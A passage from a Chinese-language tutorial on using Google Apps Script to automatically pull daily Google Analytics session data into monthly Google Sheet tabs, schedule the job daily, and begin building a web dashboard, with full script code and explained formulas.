分鐘左右完成此任務；如果有其他事要處理就需要等到這件例行工作完成才會開始或會延後發布每日數據訊息。簡單估計一下 RPA 效益： 每年消耗支出：1 人 x 30 mins x 365 天(假日數據也要補) = 182 hours 建立自動化成本：以此案例來說，約需耗費 1 人 x 5天 = 40 hours 因此我們只需要投入一週開發時間，就能長遠解決負責查數據同事的工作消耗，他就可以把精力放在更重要的事情上。目標我們的目標是使用 Google Apps Script 建立一個 RPA 自動從 Google Analytics 與內部系統報表 API 撈取每日數據並填入 Google Sheet，與搭建一個 Web UI Dashboard。最終效果 Google Sheet:https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit?usp=sharing Web GUI URL:https://script.google.com/macros/s/AKfycbz2Vk-ikU8DSXjpnLq9r6HNAn3zlNAosvDoItG0cxy0bmItRDSVyEzTdwsL2HyFUz99/exec 數據為假數據，純 Demo 使用；從 2024/04/13 開始會特別低或都保持在 0，因為我的 zhgchg.li GA 真的是「0」流量 Q_Q。需完成的任務 建立 Google Apps Script、熟悉編輯器 取得/建立對應日期的 Sheet 串接 Google Analytics 撈取數據 填充資料 設定排程，每日自動執行聲明因文章說明需求，以下程式碼會盡可能少一點抽象，增加說明性，您可依照自己實際的需求進行改寫。 文末有附上完整公開的 Google Sheet &amp; Google Apps Script，如果你懶得一步一步走，可以直接從文末附的範本去修改。Step 1. 建立 Google Apps Script只需在我們要導入自動化的報表上選擇「擴充功能」-&gt;「Apps Script」就能自動建立與 Google Sheet 報表連結的 Google Apps Script。另外也可以直接從 Google Apps Script 首頁建立 Google Apps Script ，不過這樣就不會與 Google Sheet 產生連結。 並非需要連結才能操作對應 Google Sheet ，兩種建立方式都可以，差別在於 Script 的所有權歸於誰，如果是連結報表的就是歸報表擁有者，如果是自己建立的就是歸建立著；擁有者會關係到假設該帳號因離職停用，腳本是否會失效被刪除。腳本建立後，我們可以先從上方 Rename 我們的腳本專案名稱。Google Apps Script 基礎知識再到下一步撰寫程式之前，先補充一些 Google Apps Script 的基礎知識。關於編輯器預設引入 Google 服務的 SDK (不需特別引入即可呼叫使用)： CalendarApp 行事曆 DocumentApp Google Drive FormApp Google Form SpreadsheetApp Google Sheet GmailApp Gmail 其他… 檔案：可新增多個 .gs 檔案存放不同物件程式碼，方便整理；所有檔案都會在同個 Namespace、生命週期下執行，因此要注意物件名稱、變數名稱如果重複可能會互相覆蓋。除 .gs 指令碼 檔案外，也能新增 .html HTML Template 檔案，用於渲染 Web UI。(後面會再介紹) 資料庫：別人撰寫好的資料庫 (a.k.a Lib) 我們可以透過他的 Script ID 引入使用，當然我們撰寫好的程式也能部署成資料庫給別人用。另外也有一些大神幫忙封裝的工具可以用，缺點是只能從 Google 搜尋 Script ID，官方並沒有正式的資料庫列表共查詢使用。e.g. HTML Parser Tool Cheer.io Script ID: 1ReeQ6WO8kKNxoaA_O0XEQ589cIrRvEBA9qcWpNqdOP17i47u6N9M5Xh0 服務：Google 服務的 SDK，預設沒有引入的服務可以再此追加引入使用。e.g. Google Analytics Data 還原、下一步操作 儲存 或 Control + s 執行 或 Control + r遇到錯誤直接在 Console 提示並終止腳本 偵錯有下 Break point (10) 的地方執行到會暫停中斷並跳出右側 Debug View，可按繼續執行遇到錯誤會暫停中斷並跳出右側 Debug View 偵錯、執行的目標方法(Function Name)僅能選擇當前選擇的檔案所擁有的方法。 查看編輯器執行紀錄 另外還有一點就是排版，有的瀏覽器按下「Control + [」進行縮排時會觸發返回上一頁，這點要注意！Google Apps Script GitHub Assistant Chrome Extension 版控外掛 建議安裝此 Extension 讓 Google Apps Script 與 git 串接，使其有版本控制功能，防止心血不小心改壞。 如果遇到 Push/Pull Error 或點了沒反應，請先按照上面步驟「選項」-&gt; 連接 Github or 重新驗證一次 Google 授權，即可。Logger Message可使用以下 Script 搭配 Debug 就能在底下 Console Print 出 Debug Log。Logger.log(\"Hi\")執行紀錄、錯誤資訊如果在編輯器上執行時的 Log 或報錯會直接顯示，如果要查訊執行紀錄或自動執行時發生的錯誤，可到「執行項目」頁籤查看。自動觸發「觸發條件」頁籤可設定腳本中的方法該如何自動觸發執行，可以設定的自動觸發條件有： 當 Google Sheet：開啟時、編輯時、內容變更時、提交表單時 執行 排程週期觸發：每 X 分鐘、X 小時、X 日、X 週、X 月 執行一次 特定日期觸發：YYYY-MM-DD HH:MM 時執行 當 行事曆：更新時 執行錯誤通知設定，可設定當腳本執行出錯時如何通知你。授予執行權限身份 首次執行/部署或新增引入的服務、資源，都需要重新跑一次身份授權，授權完之後的執行都會用你授權的身份執行，所以也要確保你授權(通常是當前)的帳號有該資源、服務的權限。(e.g. 例如要有該 Google Sheet 權限)。跳出帳號選擇 Pop-up 後選擇授權執行的帳號(通常是選當前 Google Apps Script 帳號)：出現「Google hasn’t verified this app」因為我們要開發的 App 是給自己用的，不需經過 Google 驗證。直接點擊「Advanced」-&gt;「Go to XXX (unsafe)」-&gt;「Allow」即可：完成授權後就能成功執行腳本，如果沒有改動資源不需要再重新授權。2. 取得/建立對應日期的 Sheet了解完基礎知識後，我們就可以撰寫第一個功能的程式了。我們建立以下多個檔案方便我們存放不同物件DailyReportStyle.gs 欄位樣式物件：class HeaderStyle { constructor() { this.color = \"#ffffff\"; this.backgroundColor = \"#e3284b\"; this.bold = false; this.size = 12; this.horizontalAlignment = \"center\"; this.verticalAlignment = \"middle\"; }}class ContentStyle { constructor() { this.color = \"#000000\"; this.backgroundColor = \"#ffffff\"; this.bold = false; this.size = 12; this.horizontalAlignment = \"center\"; this.verticalAlignment = \"middle\"; }}class HeaderDateStyle { constructor() { this.color = \"#ffffff\"; this.backgroundColor = \"#001a40\"; this.bold = true; this.size = 12; this.horizontalAlignment = \"center\"; this.verticalAlignment = \"middle\"; }}DailyReportField.gs 欄位資料物件：class DailyReportField { constructor(name, headerStyle, contentStyle, format = null, value = null) { this.name = name; this.headerStyle = headerStyle; this.contentStyle = contentStyle; this.format = format; this.value = value; }}DailyReport.gs 報表主程式邏輯：class DailyReport { constructor(sheetID, date) { this.separateSheet = SpreadsheetApp.openById(sheetID); this.date = date; this.sheetFields = [ new DailyReportField(\"日期\", new HeaderDateStyle(), new HeaderDateStyle()), new DailyReportField(\"星期\", new HeaderDateStyle(), new HeaderDateStyle()), new DailyReportField(\"日流量\", new HeaderStyle(), new ContentStyle(), \"#,##0\", '=INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;4)+INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;5)'), // =4(PC 流量) + 5(Mobile 流量) new DailyReportField(\"PC 流量\", new HeaderStyle(), new ContentStyle(), \"#,##0\"), new DailyReportField(\"Mobile 流量\", new HeaderStyle(), new ContentStyle(), \"#,##0\"), new DailyReportField(\"註冊數\", new HeaderStyle(), new ContentStyle(), \"#,##0\") ] // 日流量公式分解說明： // 1. COLUMN() 函數會回傳目前單元格的列號碼。 // 2. ADDRESS(1, COLUMN(), 4) 會以給定的行數（`COLUMN()` 的結果）和固定的列數（1）來生成一個絕對引用的地址。其中，第三個參數 4 表示不帶任何美元符號（$）的相對地址。比如，如果你在第三列的任何單元格中使用這個函數，它會回傳 \"C1\"。 // 3. SUBSTITUTE(ADDRESS(1, COLUMN(), 4), \"1\", \"\") 會將 ADDRESS 函數產生的地址中的數字 1 移除，因此只保留了列的英文字母，比如：\"C\"。 // 4. INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN(), 4), \"1\", \"\") &amp; 4) 這邊 &amp; 4 其實應該是 &amp;4。`SUBSTITUTE` 函數的結果會和數字 4 連接，形成 \"C4\" 這樣的字符串，然後 INDIRECT 函數會將這個字符串轉換成對應的單元格引用。所以，如果你在列 C 中的任何單元格使用此公式，它會引用 C4。 // 5. 類似地，`INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN(), 4), \"1\", \"\") &amp; 5)` 會引用相同列的第五行的單元格。比如，如果你在列 C 中的任何單元格使用此公式，它會引用 C5。 // 6. 最後，這兩個 INDIRECT 函數引用的單元格值相加。 } execute() { const sheet = this.getSheet(); } // 取得給定日期的目標 Sheet getSheet() { // 以月來區分 Sheet，找到當月 Sheet var thisMonthSheet = this.separateSheet.getSheetByName(this.getSheetName()); if (thisMonthSheet == null) { // 無則建立新的月 Sheet thisMonthSheet = this.makeMonthSheet(); } return thisMonthSheet; } // 月 Sheet 命名規則 getSheetName() { return Utilities.formatDate(this.date, \"GMT+8\", \"yyyy-MM\"); } // 建立新的月 Sheet makeMonthSheet() { // 新增當月 Sheet，移動到第一個位子 var thisMonthSheet = this.separateSheet.insertSheet(this.getSheetName(), {index: 0}); thisMonthSheet.activate(); this.separateSheet.moveActiveSheet(1); // 新增第一欄，欄位名稱、設定 Pinned、寬度 200 thisMonthSheet.insertColumnsBefore(1, 1); thisMonthSheet.setFrozenColumns(1); thisMonthSheet.setColumnWidths(1, 1, 200); // 填充欄位名稱 for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const text = sheetField.name; const style = sheetField.headerStyle; const range = thisMonthSheet.getRange(parseInt(currentRow) + 1, 1); this.setContent(range, text, style); range.setHorizontalAlignment(\"left\"); } // 設定欄高 thisMonthSheet.setRowHeights(1, Object.keys(this.sheetFields).length, 30); // 設定 Pinned 第一、二列(日期、星期) thisMonthSheet.setFrozenRows(2); // 新增總計欄位 thisMonthSheet.insertColumnsAfter(thisMonthSheet.getLastColumn(), 1); // 新增一欄在最後一欄 const summaryColumnIndex = thisMonthSheet.getLastColumn() + 1; // 填充總計欄位 for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const summaryRowIndex = parseInt(currentRow) + 1; const range = thisMonthSheet.getRange(summaryRowIndex, summaryColumnIndex); const style = sheetField.contentStyle; if (summaryRowIndex == 1) { // 日期... this.setContent(range, \"總計\", style); } else if (summaryRowIndex == 2) { // 星期...merge... const mergeRange = thisMonthSheet.getRange(1, summaryColumnIndex, summaryRowIndex, 1); this.setContent(mergeRange, \"總計\", style); mergeRange.merge(); } else { this.setContent(range, '=IFERROR(SUM(INDIRECT(SUBSTITUTE(ADDRESS(1, 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+'):INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN() - 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+')), 0)', style); // 1. IFERROR(value, [value_if_error]) 函數用於判斷公式中是否存在錯誤，並在有錯誤時返回指定的值。它接受兩個參數：`value` 是需要計算的表達式或函數，`value_if_error` 是當 value 發生錯誤時返回的值。在這個情境下，如果 SUM 函數中的計算發生錯誤，則返回 0。 // 2. SUM(range) 函數用於計算範圍內所有數字的總和。 // 3. INDIRECT(ref_text, [is_A1_notation]) 函數將文字字串轉換成單元格引用。這裡使用 INDIRECT 函數是為了動態生成所需的參照範圍。 // 4. SUBSTITUTE(text, old_text, new_text, [instance_num]) 函數在文字字串中替換指定的文字。這裡使用 SUBSTITUTE 是為了將 ADDRESS 函數回傳的地址中的 \"1\" 替換成其他內容。 // 5. ADDRESS(row, column, [abs_num], [a1], [sheet]) 函數根據給定的行列號碼回傳對應的單元格地址。在這裡，ADDRESS(1, 1, 4) 生成了第一行第一列的單元格地址，但是由於 abs_num 是 4，所以地址不包含工作表名稱和固定符號 $。類似地，`ADDRESS(1, COLUMN() - 1, 4)` 產生了從第一行到當前列前一列的單元格地址。 // 6. COLUMN() 函數回傳當前單元格的列號。 // 7. summaryRowIndex = 所在列 } } return thisMonthSheet; } setContent(range, text, style) { if (String(text) != \"\") { range.setValue(text); } range.setBackgroundColor(style.backgroundColor); range.setFontColor(style.color); if (style.bold) { range.setFontWeight(\"bold\"); } range.setHorizontalAlignment(style.horizontalAlignment); range.setVerticalAlignment(style.verticalAlignment); range.setFontSize(style.size); range.setBorder(true, true, true, true, true, true, \"black\", SpreadsheetApp.BorderStyle.SOLID); }}Main.gs 做為主程式入口：const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\"// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641function debug() { var report = new DailyReport(targetGoogleSheetID, new Date()); report.execute();}完成後我們回到「 Main.gs 」選擇「debug」並按下偵錯，查看執行結果是否正確、有無出錯。執行正確回到報表會出現當前新月份，並帶入預設欄位與總計欄位，如果已存在則不會有反應。3. 串接 Google Analytics 撈取數據首先需要新增「AnalyticsData」服務：使用 GA4 Debug Tool 構建查詢條件： https://ga-dev-tools.google/ga4/query-explorer/ 可邊比照 GA 4 後台篩選條件構建 本文以查詢 Sessions 數為例，區分裝置 Grouping登入授權後選擇目標資源：記下 property 底下顯示的數字，即為你要查詢的資源 GA Property ID。設定查詢參數、Filter 條件：按下「Make Reqeust」取得 Response 結果：可同步比較 GA 4 後台同樣條件的數據是否相同，如果落差太大可能是有 Filter 條件沒有加到，要再檢查一下。小記附上一個行銷同事發現的小坑，GA 有些數據會有延遲問題，可能今天查的跟昨天查的數字會不一樣(例如跳出率)，因此最好能將資料回溯幾天才能卻保值是最終的數字。 GA Debug Tool 沒問題之後我們就能將它轉換為 Google Apps Script。新增一個 GAData.gs 檔案：// Remeber add Google Analytics Data API to Services, or you'll see this error: ReferenceError: AnalyticsData is not defined// GA Debug Toole: https://ga-dev-tools.web.app/ga4/query-explorer/class GAData { constructor(date) { this.date = date; const traffic = this.fetchGADailyUsage(); this.pc_traffic = traffic[\"desktop\"]; this.mobile_traffic = traffic[\"mobile\"]; } fetchGADailyUsage() { const dimensionPlatform = AnalyticsData.newDimension(); dimensionPlatform.name = \"deviceCategory\"; const metric = AnalyticsData.newMetric(); metric.name = \"sessions\"; const dateRange = AnalyticsData.newDateRange(); // 預設查詢給定日範圍內資料 e.g. 2024-01-01 ~ 2024-01-01 dateRange.startDate = this.getDateString(); dateRange.endDate = this.getDateString(); // Filter Example: // const filterExpression = AnalyticsData.newFilterExpression(); // const filter = AnalyticsData.newFilter(); // filter.fieldName = \"landingPagePlusQueryString\"; // const stringFilter = AnalyticsData.newStringFilter() // stringFilter.value = \"/life|/article|/chat|/house|/event/230502|/event/230310\"; // stringFilter.matchType = \"PARTIAL_REGEXP\"; // filter.stringFilter = stringFilter; // filterExpression.filter = filter; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [dimensionPlatform]; request.metrics = [metric]; request.dateRanges = dateRange; // Filter Example: // const filterExpression = AnalyticsData.newFilterExpression(); // filterExpression.expression = filterExpression; // request.dimensionFilter = filterExpression; // or Not // const notFilterExpression = AnalyticsData.newFilterExpression(); // notFilterExpression.notExpression = filterExpression; // request.dimensionFilter = notFilterExpression; const report = AnalyticsData.Properties.runReport(request, \"properties/\" + gaPropertyId).rows; // 無資料 if (report == undefined) { return {\"desktop\": 0, \"mobile\": 0}; } // [{metricValues=[{value=4517}], dimensionValues=[{value=mobile}]}, {metricValues=[{value=3189}], dimensionValues=[{value=desktop}]}, {metricValues=[{value=63}], dimensionValues=[{value=tablet}]}] var result = {}; report.forEach(function(element) { result[element.dimensionValues[0].value] = element.metricValues[0].value; }); return result; } getDateString() { return Utilities.formatDate(this.date, \"GMT+8\", \"yyyy-MM-dd\"); }}Main.gs 新增測試內容：const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { var report = new DailyReport(targetGoogleSheetID, new Date()); report.execute(); // var gaData = new GAData(new Date()); Logger.log(gaData);}按下執行或偵錯取得程式撈取結果：OK! 比對相符。此步驟完成時，目錄檔案結構如上圖。4. 填充資料建好 Sheet、查好資料後，再來就是填充資料到欄位中。調整 DailyReport.gs 增加 by 日期新增欄位＆填充資料的邏輯：class DailyReport { constructor(sheetID, date, gaData, inHouseReportData) { this.separateSheet = SpreadsheetApp.openById(sheetID); this.date = date; const dateString = Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\"); const weekString = [\"星期日\", \"星期一\",\"星期二\",\"星期三\",\"星期四\",\"星期五\",\"星期六\"][date.getDay()]; // 取得星期，星期日為0，星期一為1，以此類 this.sheetFields = [ new DailyReportField(\"日期\", new HeaderDateStyle(), new HeaderDateStyle(), null, dateString), new DailyReportField(\"星期\", new HeaderDateStyle(), new HeaderDateStyle(), null, weekString), new DailyReportField(\"日流量\", new HeaderStyle(), new ContentStyle(), \"#,##0\", '=INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;4)+INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;5)'), // =4(PC 流量) + 5(Mobile 流量) new DailyReportField(\"PC 流量\", new HeaderStyle(), new ContentStyle(), \"#,##0\", gaData.pc_traffic), new DailyReportField(\"Mobile 流量\", new HeaderStyle(), new ContentStyle(), \"#,##0\", gaData.mobile_traffic), new DailyReportField(\"註冊數\", new HeaderStyle(), new ContentStyle(), \"#,##0\", inHouseReportData.registers) ] } execute() { const sheet = this.getSheet(); const dateColumnIndex = this.makeOrGetDateColumn(sheet); // 取得已存在的更新或建立新的欄位 // 填充欄位內容 for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const rowIndex = parseInt(currentRow) + 1; if (rowIndex != null) { const range = sheet.getRange(rowIndex, dateColumnIndex); const text = sheetField.value; const style = sheetField.contentStyle; this.setContent(range, text, style); this.setFormat(range, sheetField.format); } } } // 取得給定日期的目標 Sheet getSheet() { // 以月來區分 Sheet，找到當月 Sheet var thisMonthSheet = this.separateSheet.getSheetByName(this.getSheetName()); if (thisMonthSheet == null) { // 無則建立新的月 Sheet thisMonthSheet = this.makeMonthSheet(); } return thisMonthSheet; } // 月 Sheet 命名 getSheetName() { return Utilities.formatDate(this.date, \"GMT+8\", \"yyyy-MM\"); } // 建立新的月 Sheet makeMonthSheet() { // 新增當月 Sheet，移動到第一個位子 var thisMonthSheet = this.separateSheet.insertSheet(this.getSheetName(), {index: 0}); thisMonthSheet.activate(); this.separateSheet.moveActiveSheet(1); // 新增第一欄，欄位名稱、設定 Pinned、寬度 200 thisMonthSheet.insertColumnsBefore(1, 1); thisMonthSheet.setFrozenColumns(1); thisMonthSheet.setColumnWidths(1, 1, 200); // 填充欄位名稱 for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const text = sheetField.name; const style = sheetField.headerStyle; const range = thisMonthSheet.getRange(parseInt(currentRow) + 1, 1); this.setContent(range, text, style); range.setHorizontalAlignment(\"left\"); } // 設定欄高 thisMonthSheet.setRowHeights(1, Object.keys(this.sheetFields).length, 30); // 設定 Pinned 第一、二列(日期、星期) thisMonthSheet.setFrozenRows(2); // 新增總計欄位 thisMonthSheet.insertColumnsAfter(thisMonthSheet.getLastColumn(), 1); // 新增一欄在最後一欄 const summaryColumnIndex = thisMonthSheet.getLastColumn() + 1; // 填充總計欄位 for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const summaryRowIndex = parseInt(currentRow) + 1; const range = thisMonthSheet.getRange(summaryRowIndex, summaryColumnIndex); const style = sheetField.contentStyle; if (summaryRowIndex == 1) { // 日期... this.setContent(range, \"總計\", style); } else if (summaryRowIndex == 2) { // 星期...merge... const mergeRange = thisMonthSheet.getRange(1, summaryColumnIndex, summaryRowIndex, 1); this.setContent(mergeRange, \"總計\", style); mergeRange.merge(); } else { this.setContent(range, '=IFERROR(SUM(INDIRECT(SUBSTITUTE(ADDRESS(1, 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+'):INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN() - 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+')), 0)', style); } } return thisMonthSheet; } // 建立或取得日期的欄位 // 從最近一日往後加一欄位 makeOrGetDateColumn(sheet) { const firstRowColumnsRange = sheet.getRange(1, 1, 1, sheet.getLastColumn()); // 取得第一列(日期)資料範圍 const firstRowColumns = firstRowColumnsRange.getValues()[0]; // 取得資料範圍的值 0 = 第一列 var columnIndex = firstRowColumns.findIndex((date) =&gt; (date instanceof Date &amp;&amp; Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\") == Utilities.formatDate(this.date, \"GMT+8\", \"yyyy/MM/dd\"))); // 找到對應日期的欄位 Index if (columnIndex &lt; 0) { // Not Found，找到前一日的位子 var preDate = new Date(this.date); preDate.setDate(preDate.getDate() - 1); while(preDate.getMonth() == this.date.getMonth()) { columnIndex = firstRowColumns.findIndex((date) =&gt; (date instanceof Date &amp;&amp; Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\") == Utilities.formatDate(preDate, \"GMT+8\", \"yyyy/MM/dd\"))); if (columnIndex &gt;= 0) { break; } preDate.setDate(preDate.getDate() - 1); } if (columnIndex &gt;= 0) { columnIndex += 1; sheet.insertColumnsAfter(columnIndex, 1); // 在前一日欄位後新增一欄 columnIndex += 1; } } else { columnIndex += 1; } if (columnIndex &lt; 0) { sheet.insertColumnsAfter(1, 1); // 默認，直接新增一欄在第一欄後面 columnIndex = 2; } // 設定欄位寬度 sheet.setColumnWidths(columnIndex , 1, 100); return columnIndex } // 設定欄位 Format 樣式 setFormat(range, format) { if (format != null) { range.setNumberFormat(format); } } // 填充內容到欄位 setContent(range, text, style) { if (String(text) != \"\") { range.setValue(text); } range.setBackgroundColor(style.backgroundColor); range.setFontColor(style.color); if (style.bold) { range.setFontWeight(\"bold\"); } range.setHorizontalAlignment(style.horizontalAlignment); range.setVerticalAlignment(style.verticalAlignment); range.setFontSize(style.size); range.setBorder(true, true, true, true, true, true, \"black\", SpreadsheetApp.BorderStyle.SOLID); }}調整 Main.gs 增加資料串接並在構建階段賦值：const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { const date = new Date(); const gaData = new GAData(date); const inHouseReportData = fetchInHouseReportData(date); const report = new DailyReport(targetGoogleSheetID, date, gaData, inHouseReportData); report.execute(); }// 模擬部分數據資料可能是打其他平台 API 取得的。function fetchInHouseReportData(date) { // EXMAPLE REQUEST: // var options = { // 'method' : 'get', // 'headers': { // 'Authorization': 'Bearer XXX' // } // }; // OR // var options = { // 'method' : 'post', // 'headers': { // 'Authorization': 'Bearer XXX' // }, // 'payload' : data // }; // var res = UrlFetchApp.fetch(url, options); // const result = JSON.parse(res.getContentText()); // REMEMBER, DUE TO SECURITY REASON, We can't customize user-agent. return {\"registers\": Math.floor(Math.random() * (180 - 30 + 1)) + 30} // MOCK DATA random 30~180}完成後我們回到「 Main.gs 」選擇「debug」並按下偵錯，查看執行結果是否正確、有無出錯。回到 Google Sheet! 成功! 我們成功的自動新增了該日期的資料。5. 設定排程，每日自動執行腳本完成後，再來只要設定自動觸發條件，就能每日自動完成囉。調整 Main.gs 新增 cronjob() function:const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { cronjob();}// 照現實狀況來說，通常是今日查昨日數據，才是完整的資料function cronjob() { const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1); const gaData = new GAData(yesterday); const inHouseReportData = fetchInHouseReportData(yesterday); const report = new DailyReport(targetGoogleSheetID, yesterday, gaData, inHouseReportData); report.execute();}// 模擬部分數據資料可能是打其他平台 API 取得的。function fetchInHouseReportData(date) { // EXMAPLE REQUEST: // var options = { // 'method' : 'get', // 'headers': { // 'Authorization': 'Bearer XXX' // } // }; // OR // var options = { // 'method' : 'post', // 'headers': { // 'Authorization': 'Bearer XXX' // }, // 'payload' : data // }; // var res = UrlFetchApp.fetch(url, options); // const result = JSON.parse(res.getContentText()); // REMEMBER, DUE TO SECURITY REASON, We can't customize user-agent. return {\"registers\": Math.floor(Math.random() * (180 - 30 + 1)) + 30} // MOCK DATA random 30~180}在編輯器上切換到「觸發條件」頁籤，選擇右下角「新增觸發條件」： 選擇您要執行的功能：剛新增的 Main.gs Function cronjob 選擇應執行的部署作業：上端 (Head, 意為最新版) 選取活動來源：時間驅動 選取時間型觸發條件類型：日計時器 選取時段：AM 4:00 — AM 5:00 (GMT+08:00)通常在 AM 4:00 一到就會執行。 錯誤通知設定：當腳本發生錯誤時是要馬上通知，還是每日彙整一次儲存設定，完成。之後可以去「執行項目」頁籤查看執行紀錄結果： 至此我們已完成自動化查詢、新增資料、填入資料的報表 RPA 功能．🎉🎉🎉搭建 Web GUI Dashboard再來有個次要需求，我們需要建立一個簡單的 Web 呈現每日數據（類似戰情中心的概念）會在團隊背後牆上大螢幕上直接顯示。效果如下圖：新增 Web_DailyReport.gs 撰寫讀取 Google Sheet 並將欄位、樣式轉換為 HTML 格式呈現：class WebDailyReport { constructor(sheetID, dayCount) { this.separateSheet = SpreadsheetApp.openById(sheetID); this.dayCount = dayCount; this.sheetRows = [ \"日期\", \"星期\", \"日流量\", \"PC 流量\", \"Mobile 流量\", \"註冊數\" ]; } allData(startDate) { var sheetRowsIndexs = {}; var count = this.dayCount; var result = []; while (count &gt;= 0) { const preDate = new Date(startDate); preDate.setDate(preDate.getDate() - (this.dayCount - count)); const sheetName = Utilities.formatDate(preDate, \"GMT+8\", \"yyyy-MM\"); const targetSheet = this.separateSheet.getSheetByName(sheetName); if (targetSheet != null) { const firstRowColumnsRange = targetSheet.getRange(1, 1, 1, targetSheet.getLastColumn()); // 取得第一列(日期)資料範圍 const firstRowColumns = firstRowColumnsRange.getValues()[0]; // 取得資料範圍的值 0 = 第一列 var columnIndex = firstRowColumns.findIndex((date) =&gt; (date instanceof Date &amp;&amp; Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\") == Utilities.formatDate(preDate, \"GMT+8\", \"yyyy/MM/dd\"))); // 找到對應日期的欄位 Index if (columnIndex &gt;= 0) { columnIndex = parseInt(columnIndex) + 1; if (sheetRowsIndexs[sheetName] == undefined || sheetRowsIndexs[sheetName] == null) { sheetRowsIndexs[sheetName] = this.sheetRows.map((sheetRow) =&gt; this.getFieldRow(targetSheet, sheetRow)); } if (result.length == 0) { // 新增第一欄 const ranges = sheetRowsIndexs[sheetName].map((rowIndex) =&gt; (rowIndex != null) ? (targetSheet.getRange(rowIndex, 1)) : (null)); result.push(this.makeValues(ranges)); } const ranges = sheetRowsIndexs[sheetName].map((rowIndex) =&gt; (rowIndex != null) ? (targetSheet.getRange(rowIndex, columnIndex)) : (null)); result.push(this.makeValues(ranges)); } } count -= 1; } var transformResult = {}; for (const columnIndex in result) { for (const rowIndex in result[columnIndex]) { if (transformResult[rowIndex] == undefined) { transformResult[rowIndex] = []; } if (columnIndex == 0) { transformResult[rowIndex].unshift(result[columnIndex][rowIndex]); } else { transformResult[rowIndex].splice(1, 0, result[columnIndex][rowIndex]); } } } return transformResult; } // 轉換 欄位屬性 值成 顯示用物件 makeValues(ranges) { const data = ranges.map((range) =&gt; (range != null) ? (range.getDisplayValues()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const backgroundColors = ranges.map((range) =&gt; (range != null) ? (range.getBackgrounds()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const colors = ranges.map((range) =&gt; (range != null) ? (range.getFontColorObjects()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const sizes = ranges.map((range) =&gt; (range != null) ? (range.getFontSizes()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const bolds = ranges.map((range) =&gt; (range != null) ? (range.getFontWeights()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const horizontalAlignments = ranges.map((range) =&gt; (range != null) ? (range.getHorizontalAlignments()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const verticalAlignments = ranges.map((range) =&gt; (range != null) ? (range.getVerticalAlignments()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); var result = []; for(const index in data) { const row = data[index]; result.push({ \"value\": row, \"backgroundColor\": backgroundColors[index], \"color\": this.colorStripper(colors[index]?.asRgbColor()?.asHexString()), \"size\": sizes[index], \"bold\": bolds[index], \"horizontalAlignment\": this.alignConventer(horizontalAlignments[index]), \"verticalAlignment\": verticalAlignments[index] }); } return result; } colorStripper(colorString) { if (colorString == undefined || colorString == null) { return null } if (colorString.length == 9) { return \"#\"+colorString.substring(3, 9); } else { return colorString; } } alignConventer(horizontalAlignment) { if (horizontalAlignment == undefined || horizontalAlignment == null) { return null } return horizontalAlignment.replace('general-', '') } getFieldRow(sheet, name) { const firstColumnRowsRange = sheet.getRange(1, 1, sheet.getLastRow(), 1); // 取得第一欄(欄位)資料範圍 const firstColumnRows = firstColumnRowsRange.getValues(); // 取得資料範圍的值 const foundIndex = firstColumnRows.findIndex((firstColumnRow) =&gt; firstColumnRow[0] == name); if (foundIndex &lt; 0) { return null; } else { return foundIndex + 1; } }}Main.gs 增加 Web 請求 Handle：const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const 